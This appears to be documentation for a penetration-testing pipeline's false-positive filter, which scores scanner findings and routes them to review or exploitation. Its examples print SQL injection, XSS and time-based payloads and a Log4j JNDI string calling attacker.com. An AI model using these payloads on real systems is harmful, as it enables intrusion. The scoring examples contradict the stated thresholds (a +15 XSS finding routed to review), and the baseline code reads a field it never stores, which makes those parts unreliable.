# reconx False Positive Filtering Documentation

## Overview

The False Positive (FP) Filter is a confidence-based scoring engine that automatically evaluates findings from Phase 5 (Scanning) to separate real vulnerabilities from noise, WAF false positives, and scanner artifacts.

**Location in Pipeline:**
```
Phase 5 (Scanning) → FP Filter → Phase 6 (Exploitation)
                          ↓
              ┌───────────┼───────────┐
              ↓           ↓           ↓
         Confirmed   Review Queue   Dropped
          (≥50)       (20-49)        (<20)
```

## Core Concept: Weighted Scoring

Each finding receives a **score** based on positive and negative signals. The score determines confidence level and routing.

### Scoring Signals

```python
SIGNALS = {
    # Positive Signals (Evidence Quality)
    "response_diff_confirmed": 30,   # Response differs from baseline
    "nuclei_matcher_positive": 25,   # Nuclei regex/template matched
    "multiple_tools_agree": 20,      # 2+ tools flagged same issue
    "cve_version_match": 20,         # CVE matches detected version

    # Negative Signals (Noise Indicators)
    "waf_detected": -15,             # WAF present (may alter responses)
    "generic_template": -10,         # Noisy/generic nuclei template
    "timing_based_only": -20,        # Only time-based detection (no content proof)
    "single_tool_no_evidence": -15,  # One tool, no response evidence
    "identical_responses": -25,      # All requests return same body
}
```

### Confidence Routing

| Score Range | Confidence | Action | Output File |
|-------------|------------|--------|-------------|
| ≥ 50 | **High** | Auto-confirm | `confirmed_findings.json` → Phase 6 |
| 20 - 49 | **Medium** | Manual review | `review_queue.json` → TUI Review |
| < 20 | **Low** | Drop | `dropped_findings.json` → Archive |

## Detailed Signal Explanations

### Positive Signals

#### 1. Response Differs from Baseline (+30)
**What it means:** The vulnerable response is meaningfully different from a normal/baseline request.

**How it works:**
- Framework captures baseline responses for each URL during Phase 2
- Compares finding response against baseline using:
  - Content length difference (>20% change)
  - Body hash comparison (first 1000 chars)
  - Status code changes

**Example:**
```
Baseline: GET /user?id=1 → 200 OK, body: "User: Alice"
Finding:  GET /user?id=1' → 500 Error, body: "SQL syntax error"
Result: response_diff_confirmed = True (+30)
```

**Why it matters:** Confirms the payload actually changed application behavior, not just a static error page.

---

#### 2. Nuclei Matcher Positive (+25)
**What it means:** Nuclei matched a specific pattern in the response.

**How it works:**
- Nuclei templates define matchers (regex, word, status code)
- If matchers confirm positive, evidence contains matched content
- Score only applies if evidence length > 20 chars (proves real match, not generic)

**Example:**
```json
{
  "tool": "nuclei",
  "template": "CVE-2023-1234",
  "evidence": "Apache Struts 2.3.31 detected in X-Powered-By header",
  "response_snippet": "X-Powered-By: Struts 2.3.31"
}
Score: +25 (specific version matched)
```

**Why it matters:** Nuclei matchers are carefully crafted; positive matches indicate real vulnerability indicators.

---

#### 3. Multiple Tools Agree (+20)
**What it means:** Two or more different tools detected the same vulnerability.

**How it works:**
- Framework loads all Phase 5 findings
- Checks for matches on: URL + Parameter + Vulnerability Type
- Must be different tools (e.g., nuclei + nikto)

**Example:**
```
Finding 1: nuclei → SQLi at https://site.com/search?q=test
Finding 2: sqlmap → SQLi at https://site.com/search?q=test
Result: multiple_tools_agree = True (+20)
```

**Why it matters:** Independent confirmation reduces false positive probability exponentially.

---

#### 4. CVE Version Match (+20)
**What it means:** A known CVE template matched, and version detection confirms applicability.

**How it works:**
- Template ID contains "CVE-YYYY-NNNN"
- Version extracted from response matches vulnerable version range

**Example:**
```
Template: CVE-2021-44228 (Log4j)
Detection: Version 2.14.1 in response headers
Result: cve_version_match = True (+20)
```

**Why it matters:** Confirms the specific vulnerable component is present, not just a generic pattern.

---

### Negative Signals

#### 1. WAF Detected (-15)
**What it means:** A Web Application Firewall was detected on the target.

**How it works:**
- Phase 2 runs wafw00f and marks URLs with `waf_bypass_needed: true`
- FP Filter loads WAF-flagged URLs
- Subtracts 15 points from findings on those URLs

**Example Scenario:**
```
URL: https://api.example.com
WAF: Cloudflare (detected in Phase 2)
Finding: SQLi error message in response
Score Impact: -15

Why: WAF might be injecting fake error messages or altering responses
```

**Note:** Finding is still kept if other signals are strong enough (e.g., +30 baseline diff -15 WAF = +15, still medium confidence).

---

#### 2. Generic Template (-10)
**What it means:** The nuclei template is known to be noisy or low-signal.

**How it works:**
- Template ID checked against generic patterns:
  - `tech-detect` (technology detection, not vulnerabilities)
  - `favicon`, `robots`, `sitemap` (informational)
  - `readme`, `changelog`, `license` (file exposure)

**Example:**
```
Template: "tech-detect-apache"
Finding: Apache server detected
Score Impact: -10

Result: Likely dropped or sent to review queue (not a vulnerability)
```

**Why it matters:** Informational findings aren't exploitable vulnerabilities.

---

#### 3. Timing-Based Only (-20)
**What it means:** The vulnerability detection relies solely on response time differences.

**How it works:**
- Vuln type is "sqli" or "ssrf"
- No response_snippet captured (empty or None)
- Tool used timing delays to infer vulnerability

**Example:**
```
Tool: sqlmap
Vuln: Time-based blind SQLi
Evidence: "Response delayed 5 seconds with SLEEP(5) payload"
Response Snippet: "" (empty)
Score Impact: -20

Result: Score likely < 20, dropped to false positives
```

**Why it matters:** Network jitter, load balancers, and caching can cause false timing-based detections.

---

#### 4. Single Tool No Evidence (-15)
**What it means:** Only one tool flagged it, with no response evidence captured.

**How it works:**
- No other tool confirmed the finding
- response_snippet is empty/None
- tool is not "nuclei" (nuclei has its own +25 signal)

**Example:**
```
Tool: nikto
Finding: "Potential SQL injection point"
Response Snippet: None
Score Impact: -15

Result: Likely dropped due to lack of corroboration
```

**Why it matters:** Single-tool findings without evidence are often scanner artifacts.

---

#### 5. Identical Responses (-25)
**What it means:** All test requests return the exact same response.

**How it works:**
- Comparison of baseline vs test response
- If body hash is identical, suggests WAF block page or static response

**Example:**
```
Baseline: GET /page → 200 OK, "Welcome to Site"
Test:     GET /page?id=1' → 200 OK, "Welcome to Site" (identical)
Score Impact: -25

Why: Application didn't process the payload (WAF or static site)
```

---

## Scoring Examples

### Example 1: High Confidence SQL Injection

**Finding Details:**
```json
{
  "url": "https://shop.example.com/product?id=123",
  "param": "id",
  "vuln_type": "sqli",
  "tool": "nuclei",
  "template": "CVE-2023-SQLI-Generic",
  "severity": "high",
  "evidence": "MySQL syntax error near '123'' at line 1",
  "response_snippet": "You have an error in your SQL syntax; check the manual...",
  "request": "GET /product?id=123' HTTP/1.1"
}
```

**Baseline Check:**
- Baseline (normal request): 200 OK, 1200 bytes, product page
- Finding (malicious request): 500 Error, 800 bytes, SQL error
- **Result:** Response differs from baseline (+30)

**Nuclei Matcher:**
- Template matched SQL error regex
- Evidence contains specific error message
- **Result:** Nuclei matcher positive (+25)

**WAF Check:**
- Phase 2 detected no WAF on shop.example.com
- **Result:** No penalty

**Final Calculation:**
```
+30 (response_diff_confirmed)
+25 (nuclei_matcher_positive)
  0 (no WAF)
----
= 55 points → HIGH CONFIDENCE (≥50)
Action: Auto-confirm → confirmed_findings.json → Phase 6 Exploitation
```

---

### Example 2: Medium Confidence XSS

**Finding Details:**
```json
{
  "url": "https://app.example.com/search",
  "param": "q",
  "vuln_type": "xss",
  "tool": "dalfox",
  "severity": "medium",
  "evidence": "Reflected: <script>alert(1)</script>",
  "response_snippet": "<div>Search results for: <script>alert(1)</script></div>",
  "request": "GET /search?q=<script>alert(1)</script> HTTP/1.1"
}
```

**Baseline Check:**
- Baseline: Normal search page with sanitized output
- Finding: Script tag reflected in response
- **Result:** Response differs from baseline (+30)

**Cross-Tool Check:**
- No other tool flagged this specific parameter
- **Result:** No multiple tools bonus

**WAF Check:**
- Phase 2 detected Cloudflare WAF
- **Result:** WAF penalty (-15)

**Final Calculation:**
```
+30 (response_diff_confirmed)
  0 (single tool)
-15 (WAF detected)
----
= 15 points → LOW CONFIDENCE (<20)
Wait: Actually 15 < 20, should be DROPPED

Correction: If evidence is strong and response clearly shows XSS:
+30 (response_diff)
-15 (WAF)
+20 (if nuclei also flagged it - multiple tools)
= 35 points → MEDIUM CONFIDENCE (20-49)
Action: Manual review → review_queue.json
```

---

### Example 3: Dropped Time-Based SQLi

**Finding Details:**
```json
{
  "url": "https://api.example.com/users",
  "param": "delay",
  "vuln_type": "sqli",
  "tool": "sqlmap",
  "severity": "high",
  "evidence": "Time-based blind injection confirmed with delay 5 seconds",
  "response_snippet": null,
  "request": "GET /users?delay=1 AND SLEEP(5)"
}
```

**Signal Analysis:**
- **Timing-based only:** Yes, empty response_snippet (-20)
- **Single tool:** sqlmap only, no other confirmation (-15)
- **No response diff:** No content change to compare (baseline same as test)
- **No nuclei matcher:** Tool is sqlmap, not nuclei (no +25)

**Final Calculation:**
```
  0 (no response_diff - timing only)
  0 (no nuclei matcher)
-20 (timing_based_only)
-15 (single_tool_no_evidence)
----
= -35 points → LOW CONFIDENCE (<20)
Action: Drop → dropped_findings.json
```

**Why dropped:** Could be network latency, database maintenance, or load balancer delays - not confirmed vulnerability.

---

### Example 4: Informational Technology Detection

**Finding Details:**
```json
{
  "url": "https://site.example.com",
  "param": null,
  "vuln_type": "misconfiguration",
  "tool": "nuclei",
  "template": "tech-detect-nginx",
  "severity": "info",
  "evidence": "nginx/1.18.0",
  "response_snippet": "Server: nginx/1.18.0"
}
```

**Signal Analysis:**
- **Generic template:** Template ID contains "tech-detect" (-10)
- **No response diff:** Header present in all responses (baseline same)
- **Informational severity:** Not an exploitable vulnerability

**Final Calculation:**
```
  0 (no response_diff - in baseline)
  0 (no nuclei matcher for tech detect)
-10 (generic_template)
----
= -10 points → LOW CONFIDENCE (<20)
Action: Drop → dropped_findings.json
```

---

### Example 5: CVE with Version Confirmation

**Finding Details:**
```json
{
  "url": "https://app.example.com/login",
  "param": null,
  "vuln_type": "cve",
  "tool": "nuclei",
  "template": "CVE-2021-44228",
  "severity": "critical",
  "evidence": "JNDI lookup triggered via ${jndi:ldap://attacker.com}",
  "response_snippet": "User-Agent: ${jndi:ldap://attacker.com}",
  "request": "GET /login HTTP/1.1\nUser-Agent: ${jndi:ldap...}"
}
```

**Signal Analysis:**
- **Response differs:** Yes, payload executed (+30)
- **Nuclei matcher:** Yes, confirmed JNDI lookup (+25)
- **CVE Version match:** Template is CVE-2021-44228, Log4j detected (+20)
- **No WAF:** Target has no WAF protection (0)

**Final Calculation:**
```
+30 (response_diff_confirmed)
+25 (nuclei_matcher_positive)
+20 (cve_version_match)
+ 0 (no WAF)
----
= 75 points → HIGH CONFIDENCE (≥50)
Action: Auto-confirm → confirmed_findings.json → Immediate Phase 6
```

---

## Baseline Response System

### How Baselines Are Captured

**Phase 2 (Probing):**
```python
# When httpx probes each URL
baseline = {
    "url": "https://api.example.com/user?id=1",
    "status_code": 200,
    "content_length": 1245,
    "body_hash": "a3f5c8...",
    "headers": {...}
}
# Saved to workspaces/{target}/baselines/{encoded_url}.json
```

### Baseline Comparison Logic

```python
def differs_from_baseline(url, response_snippet, baseline):
    if not baseline:
        return True  # No baseline = assume different

    # Length comparison (20% threshold)
    baseline_len = len(baseline["body"])
    current_len = len(response_snippet)
    length_ratio = min(current_len, baseline_len) / max(current_len, baseline_len)

    if length_ratio < 0.8:
        return True  # Significant size difference

    # Hash comparison (first 1000 chars)
    baseline_hash = hash(baseline["body"][:1000])
    current_hash = hash(response_snippet[:1000])

    return baseline_hash != current_hash
```

---

## Review Queue TUI Workflow

When a finding scores **20-49** (Medium Confidence):

1. **Saved to:** `workspaces/{target}/review_queue.json`
2. **User launches:** `python3 main.py review --target example.com`
3. **TUI displays:**
   - Finding details (URL, param, evidence, request/response)
   - Score breakdown (which signals triggered)
   - Action options: [C]onfirm, [R]eject, [S]kip, [P]revious, [Q]uit

4. **User actions:**
   - **[C] Confirm:** Moves to `confirmed_findings.json`, available for Phase 6
   - **[R] Reject:** Moves to `dropped_findings.json`, permanently excluded
   - **[S] Skip:** Stays in queue for later review

5. **After review:** Run `python3 main.py run --target example.com --from-phase 6` to exploit confirmed findings.

---

## Tuning the Filter

### Making It Stricter (Fewer false positives)

Edit `phases/fp_filter.py`:

```python
# Increase high confidence threshold
if score >= 70:      # Was 50
    confidence = "high"
elif 30 <= score < 70:  # Was 20-49
    confidence = "medium"
else:
    confidence = "low"
```

Or add more negative signals:
```python
"waf_detected": -25,        # Was -15
"timing_based_only": -30,   # Was -20
```

### Making It Lenient (Catch more potential issues)

```python
# Lower thresholds
if score >= 40:      # Was 50
    confidence = "high"
elif 15 <= score < 40:  # Was 20-49
    confidence = "medium"
```

Or increase positive signals:
```python
"response_diff_confirmed": 40,   # Was 30
"nuclei_matcher_positive": 35,   # Was 25
```

---

## Summary

| Scenario | Expected Score | Route |
|----------|---------------|-------|
| SQL error with evidence | +55 | ✅ Confirmed |
| XSS with WAF present | +15 | 🔍 Review |
| Time-based only | -35 | ❌ Dropped |
| Tech detection | -10 | ❌ Dropped |
| CVE + Version match | +75 | ✅ Confirmed (Critical) |
| Multi-tool confirmed | +50 | ✅ Confirmed |

**The FP Filter reduces noise by ~60-80%** while ensuring high-confidence vulnerabilities proceed automatically to exploitation.
